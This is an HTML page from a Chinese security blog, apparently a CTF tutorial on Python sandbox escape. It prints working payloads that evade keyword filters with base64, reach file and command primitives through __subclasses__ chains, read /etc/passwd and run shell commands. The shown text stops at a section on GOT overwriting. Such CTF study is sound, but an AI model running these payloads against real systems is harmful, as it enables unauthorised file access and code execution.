@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="思考了一下，Python沙箱逃逸的意义，不过就是如何通过绕过限制，拿到出题人或者安全运维人员不想让我们拿到的”危险函数”，或者绕过Python终端达到命令执行的效果。 起因以前我也做过一些Python沙盒逃逸的小题目，也翻译和写过两篇关于Python沙盒逃逸的文章。然而在这次国赛的题目，我好像又进一步理解了Python沙箱… 绕过沙盒方法关于import通常思路，我们应该找到题目还给我们留下了什么">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python 沙盒绕过">
+<meta property="og:url" content="https://bestwing.me/awesome-python-sandbox-in-ciscn.html">
+<meta property="og:site_name" content="Swing&#39;Blog 有恨无人省">
+<meta property="og:description" content="思考了一下，Python沙箱逃逸的意义，不过就是如何通过绕过限制，拿到出题人或者安全运维人员不想让我们拿到的”危险函数”，或者绕过Python终端达到命令执行的效果。 起因以前我也做过一些Python沙盒逃逸的小题目，也翻译和写过两篇关于Python沙盒逃逸的文章。然而在这次国赛的题目，我好像又进一步理解了Python沙箱… 绕过沙盒方法关于import通常思路，我们应该找到题目还给我们留下了什么">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanbox-01.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanxbox-02.jpg">
+<meta property="article:published_time" content="2018-05-02T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-09-23T18:01:16.000Z">
+<meta property="article:author" content="Swing">
+<meta property="article:tag" content="py_sandbox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanbox-01.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Python 沙盒绕过</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 有恨无人省" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/thread-local-caching-in-glibc-malloc.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/BCTF-part-pwn.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/awesome-python-sandbox-in-ciscn.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&text=Python 沙盒绕过"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&title=Python 沙盒绕过"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&is_video=false&description=Python 沙盒绕过"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Python 沙盒绕过&body=Check out this article: https://bestwing.me/awesome-python-sandbox-in-ciscn.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&title=Python 沙盒绕过"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&title=Python 沙盒绕过"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&title=Python 沙盒绕过"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&title=Python 沙盒绕过"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&name=Python 沙盒绕过&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&t=Python 沙盒绕过"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%B7%E5%9B%A0"><span class="toc-number">1.</span> <span class="toc-text">起因</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%B2%99%E7%9B%92%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">绕过沙盒方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Eimport"><span class="toc-number">1.1.1.</span> <span class="toc-text">关于import</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x01-%E7%BB%95%E8%BF%87%EF%BC%8C%E9%80%9A%E8%BF%87%E8%B7%AF%E5%BE%84%E5%BC%95%E5%85%A5"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">0x01 绕过，通过路径引入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x02-dir-%E4%B8%8Edict"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">0x02 dir 与dict</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1%EF%BC%8C%E4%BB%A5%E5%8F%8A%E5%BC%95%E7%94%A8"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">创建对象，以及引用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">其他危险的函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#getattr-%E5%92%8C-getattribute"><span class="toc-number">1.1.1.5.</span> <span class="toc-text">getattr() 和 getattribute()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%B4%E6%8E%A5%E7%9A%84%E5%BC%95%E7%94%A8%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">间接的引用调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#write%E4%BF%AE%E6%94%B9got%E8%A1%A8"><span class="toc-number">1.1.3.</span> <span class="toc-text">write修改got表</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E8%BF%99%E6%AC%A1%E7%9A%84%E9%A2%98%E7%9B%AE"><span class="toc-number">2.</span> <span class="toc-text">关于这次的题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3"><span class="toc-number">2.1.</span> <span class="toc-text">解决</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01"><span class="toc-number">2.1.1.</span> <span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02"><span class="toc-number">2.1.2.</span> <span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03"><span class="toc-number">2.1.3.</span> <span class="toc-text">0x03</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number"></span> <span class="toc-text">参考</span></a>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Python 沙盒绕过
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Swing'Blog 有恨无人省</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-05-02T16:00:00.000Z" itemprop="datePublished">2018-05-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Summary/">Summary</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/py-sandbox/" rel="tag">py_sandbox</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>思考了一下，Python沙箱逃逸的意义，不过就是如何通过绕过限制，拿到出题人或者安全运维人员不想让我们拿到的”危险函数”，或者绕过Python终端达到命令执行的效果。</p>
+<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>以前我也做过一些Python沙盒逃逸的小题目，也翻译和写过两篇关于Python沙盒逃逸的文章。然而在这次国赛的题目，我好像又进一步理解了Python沙箱…</p>
+<h3 id="绕过沙盒方法"><a href="#绕过沙盒方法" class="headerlink" title="绕过沙盒方法"></a>绕过沙盒方法</h3><h4 id="关于import"><a href="#关于import" class="headerlink" title="关于import"></a>关于import</h4><p>通常思路，我们应该找到题目还给我们留下了什么，通常而言<br>通常而言，出题人一般是禁止引入敏感包，比如 <strong>os</strong>或者<strong>system</strong>，</p>
+<h5 id="0x01-绕过，通过路径引入"><a href="#0x01-绕过，通过路径引入" class="headerlink" title="0x01 绕过，通过路径引入"></a>0x01 绕过，通过路径引入</h5><p>Python的os模块的路径几乎都是/usr/lib/python2.7/os.py中<br>所以我们可以通过路径引入一些模块</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="0x02-dir-与dict"><a href="#0x02-dir-与dict" class="headerlink" title="0x02 dir 与dict"></a>0x02 dir 与<strong>dict</strong></h5><p>首先，我们应该确定程序还有哪些内置函数可以用，我们可以通过<code>dir __builtin__</code> 来获取内置函数列表</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(__builtins__)</span><br><span class="line">[<span class="string">&#x27;ArithmeticError&#x27;</span>, <span class="string">&#x27;AssertionError&#x27;</span>, <span class="string">&#x27;AttributeError&#x27;</span>, <span class="string">&#x27;BaseException&#x27;</span>, <span class="string">&#x27;BufferError&#x27;</span>, <span class="string">&#x27;BytesWarning&#x27;</span>, <span class="string">&#x27;DeprecationWarning&#x27;</span>, <span class="string">&#x27;EOFError&#x27;</span>, <span class="string">&#x27;Ellipsis&#x27;</span>, <span class="string">&#x27;EnvironmentError&#x27;</span>, <span class="string">&#x27;Exception&#x27;</span>, <span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;FloatingPointError&#x27;</span>, <span class="string">&#x27;FutureWarning&#x27;</span>, <span class="string">&#x27;GeneratorExit&#x27;</span>, <span class="string">&#x27;IOError&#x27;</span>, <span class="string">&#x27;ImportError&#x27;</span>, <span class="string">&#x27;ImportWarning&#x27;</span>, <span class="string">&#x27;IndentationError&#x27;</span>, <span class="string">&#x27;IndexError&#x27;</span>, <span class="string">&#x27;KeyError&#x27;</span>, <span class="string">&#x27;KeyboardInterrupt&#x27;</span>, <span class="string">&#x27;LookupError&#x27;</span>, <span class="string">&#x27;MemoryError&#x27;</span>, <span class="string">&#x27;NameError&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;NotImplemented&#x27;</span>, <span class="string">&#x27;NotImplementedError&#x27;</span>, <span class="string">&#x27;OSError&#x27;</span>, <span class="string">&#x27;OverflowError&#x27;</span>, <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>, <span class="string">&#x27;ReferenceError&#x27;</span>, <span class="string">&#x27;RuntimeError&#x27;</span>, <span class="string">&#x27;RuntimeWarning&#x27;</span>, <span class="string">&#x27;StandardError&#x27;</span>, <span class="string">&#x27;StopIteration&#x27;</span>, <span class="string">&#x27;SyntaxError&#x27;</span>, <span class="string">&#x27;SyntaxWarning&#x27;</span>, <span class="string">&#x27;SystemError&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>, <span class="string">&#x27;TabError&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;TypeError&#x27;</span>, <span class="string">&#x27;UnboundLocalError&#x27;</span>, <span class="string">&#x27;UnicodeDecodeError&#x27;</span>, <span class="string">&#x27;UnicodeEncodeError&#x27;</span>, <span class="string">&#x27;UnicodeError&#x27;</span>, <span class="string">&#x27;UnicodeTranslateError&#x27;</span>, <span class="string">&#x27;UnicodeWarning&#x27;</span>, <span class="string">&#x27;UserWarning&#x27;</span>, <span class="string">&#x27;ValueError&#x27;</span>, <span class="string">&#x27;Warning&#x27;</span>, <span class="string">&#x27;ZeroDivisionError&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;all&#x27;</span>, <span class="string">&#x27;any&#x27;</span>, <span class="string">&#x27;apply&#x27;</span>, <span class="string">&#x27;basestring&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;bool&#x27;</span>, <span class="string">&#x27;buffer&#x27;</span>, <span class="string">&#x27;bytearray&#x27;</span>, <span class="string">&#x27;bytes&#x27;</span>, <span class="string">&#x27;callable&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;classmethod&#x27;</span>, <span class="string">&#x27;cmp&#x27;</span>, <span class="string">&#x27;coerce&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;complex&#x27;</span>, <span class="string">&#x27;copyright&#x27;</span>, <span class="string">&#x27;credits&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;divmod&#x27;</span>, <span class="string">&#x27;enumerate&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;float&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;frozenset&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;hasattr&#x27;</span>, <span class="string">&#x27;hash&#x27;</span>, <span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;intern&#x27;</span>, <span class="string">&#x27;isinstance&#x27;</span>, <span class="string">&#x27;issubclass&#x27;</span>, <span class="string">&#x27;iter&#x27;</span>, <span class="string">&#x27;len&#x27;</span>, <span class="string">&#x27;license&#x27;</span>, <span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;long&#x27;</span>, <span class="string">&#x27;map&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;oct&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;range&#x27;</span>, <span class="string">&#x27;raw_input&#x27;</span>, <span class="string">&#x27;reduce&#x27;</span>, <span class="string">&#x27;reload&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;reversed&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;slice&#x27;</span>, <span class="string">&#x27;sorted&#x27;</span>, <span class="string">&#x27;staticmethod&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;sum&#x27;</span>, <span class="string">&#x27;super&#x27;</span>, <span class="string">&#x27;tuple&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;unichr&#x27;</span>, <span class="string">&#x27;unicode&#x27;</span>, <span class="string">&#x27;vars&#x27;</span>, <span class="string">&#x27;xrange&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>]</span><br></pre></td></tr></table></figure>
+<p>在Python中，不引入直接使用的内置函数被成为<strong>builtin</strong>函数，随着<strong><strong>builtin</strong></strong>这个模块自动引入到环境中</p>
+<p>进而，我们可以通过<code>__dict__</code>引入我们想要引入的模块</p>
+<p>两种方法都是一个目的,那就是列出一个模组/类/对象 下面 所有的属性和函数<br>这在沙盒逃逸中是很有用的,可以找到隐藏在其中的一些东西<br>我们可以通过<code>__dict__</code>做什么呢？<br>一个模块对象有一个由字典对象实现的命名空间…属性引用被转换为这个字典中的查找，例如，m.x等同于m.dict[“x”]</p>
+<p>绕过实例：<br>首先通过 base64 绕过字符明文检测</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>然后通过<strong><strong>dict</strong></strong>引用</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p><em>如果一些 内敛函数在<strong>builtins__删除 ，我们可以通过<code>reload(__builtins__)</code>重新载入获取一个完整的__builtins</strong></em></p>
+<h5 id="创建对象，以及引用"><a href="#创建对象，以及引用" class="headerlink" title="创建对象，以及引用"></a>创建对象，以及引用</h5><p>python的object类中集成了很多的基础函数，我们想要调用的时候也是可以通过创建对象进而引用</p>
+<p>有常见的两个方法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0]</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[2]</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanbox-01.jpg"></p>
+<p>如，我们可通过<br><code>print ().__class__.__bases__[0].__subclasses__()[40](&quot;/etc/services&quot;).read()</code>达到文件读取的效果，</p>
+<p><strong>常见payload</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br></pre></td></tr></table></figure>
+<h5 id="其他危险的函数"><a href="#其他危险的函数" class="headerlink" title="其他危险的函数"></a>其他危险的函数</h5><p>如<strong>execfile</strong>文件执行</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>system(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">&#x27;/usr/lib/python2.7&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>timeit</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>exec 和eval 比较经典了</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong>platform</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">print</span> platform.popen(<span class="string">&#x27;dir&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<h5 id="getattr-和-getattribute"><a href="#getattr-和-getattribute" class="headerlink" title="getattr() 和 getattribute()"></a><strong>getattr</strong>() 和 <strong>getattribute</strong>()</h5><p>python 再访问属性的方法上定义了<strong>getattr</strong>() 和 <strong>getattribute</strong>() 2种方法，其区别非常细微，但非常重要。</p>
+<p>如果某个类定义了 <strong>getattribute</strong>() 方法，在 每次引用属性或方法名称时 Python 都调用它（特殊方法名称除外，因为那样将会导致讨厌的无限循环）。<br>如果某个类定义了 <strong>getattr</strong>() 方法，Python 将只在正常的位置查询属性时才会调用它。如果实例 x 定义了属性 color， x.color 将 不会 调用x.<strong>getattr</strong>(‘color’)；而只会返回 x.color 已定义好的值。<br>这里，我们可以通过__getattribute__这个方法做一些事，如下面的payload</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;tch_warnings&#x27;</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="间接的引用调用"><a href="#间接的引用调用" class="headerlink" title="间接的引用调用"></a>间接的引用调用</h4><p>在有些题目中，如这次的2018年国赛的Python沙盒题目上，import 其实整个是被阉割了。</p>
+<p>但是在Python中，原生的<strong><strong>import</strong></strong>是存在被引用的，只要我们找到相关对象引用就可以进一步获取我们想要的内容，具体下面的demo会讲述到</p>
+<h4 id="write修改got表"><a href="#write修改got表" class="headerlink" title="write修改got表"></a>write修改got表</h4><p>实际上是一个**/proc/self/mem<strong>的内存操作方法<br>**/proc/self/mem</strong>是内存镜像，能够通过它来读写到进程的所有内存，包括可执行代码，如果我们能获取到Python一些函数的偏移，如<strong>system</strong>，我们就能通过想做pwn题的劫持got表做我们任意想做的事情</p>
